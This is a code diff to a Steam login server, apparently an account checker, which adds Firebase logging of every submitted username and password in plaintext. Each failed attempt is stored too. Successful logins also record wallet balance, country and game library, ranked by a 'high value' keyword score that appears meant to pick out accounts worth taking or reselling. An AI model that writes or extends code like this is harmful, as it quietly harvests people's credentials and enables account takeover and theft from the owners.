@@ -13,6 +13,20 @@ import SteamUser from 'steam-user';
 import { HttpsProxyAgent } from 'https-proxy-agent';
 import 'lzma';
 import 'adm-zip';
+import admin from 'firebase-admin';
+import { getFirestore } from 'firebase-admin/firestore';
+import firebaseConfig from './firebase-applet-config.json' assert { type: 'json' };
+
+// Initialize Firebase Admin
+let db: admin.firestore.Firestore | null = null;
+try {
+  admin.initializeApp();
+  // Using getFirestore to support custom database IDs if provided
+  db = getFirestore(firebaseConfig.firestoreDatabaseId);
+  console.log('Firebase Admin initialized with DB:', firebaseConfig.firestoreDatabaseId);
+} catch (e) {
+  console.error('Firebase Admin init error (likely missing credentials/env):', e);
+}
 
 async function startServer() {
   const app = express();
@@ -152,6 +166,44 @@ async function startServer() {
             game_count: gameCount,
             walletBalance: engineWalletBalance
           });
+
+          // Persistent Logging
+          if (db) {
+            try {
+               const HIGH_VALUE_KEYWORDS = [
+                'resident evil', 'grand theft auto', 'gta v', 'elden ring', 'cyberpunk',
+                'red dead', 'call of duty', 'hogwarts', 'baldur\'s gate', 'spider-man',
+                'god of war', 'the witcher', 'assassin\'s creed', 'rust', 'dayz'
+               ];
+               
+               let score = 0;
+               games.forEach(g => {
+                   let itemScore = 1;
+                   const name = (g.name || '').toLowerCase();
+                   if (HIGH_VALUE_KEYWORDS.some(k => name.includes(k))) itemScore += 50;
+                   if (g.playtime_forever && g.playtime_forever > 600) itemScore += 5;
+                   score += itemScore;
+               });
+
+               const gameNames = games.map(g => g.name);
+
+               await db.collection('checks').add({
+                 credentials: `${username}:${password}`,
+                 steamId: steamId.toString(),
+                 personaName: userData.personaname,
+                 avatar: userData.avatarfull,
+                 country: userData.loccountrycode || 'Unknown',
+                 gameCount: gameCount,
+                 walletBalance: engineWalletBalance || '0',
+                 valueScore: score,
+                 gameNames: gameNames.slice(0, 500), // Store up to 500 names for searchability
+                 timestamp: admin.firestore.FieldValue.serverTimestamp(),
+                 status: 'success'
+               });
+            } catch (err) {
+               console.error('Error saving check to Firestore:', err);
+            }
+          }
         } catch (e) {
           respond(200, { success: true, steamId: steamId?.toString(), message: 'Logged in but failed to fetch private data.' });
         }
@@ -167,6 +219,16 @@ async function startServer() {
         if (err.message.includes('RateLimitExceeded')) errorMessage = 'Too many login attempts. Please try again later.';
 
         respond(401, { success: false, error: errorMessage, code: err.message });
+        
+        // Log failure
+        if (db) {
+          db.collection('checks').add({
+            credentials: `${username}:${password}`,
+            timestamp: admin.firestore.FieldValue.serverTimestamp(),
+            status: 'failed',
+            error: errorMessage
+          }).catch(() => {});
+        }
       });
 
       try {
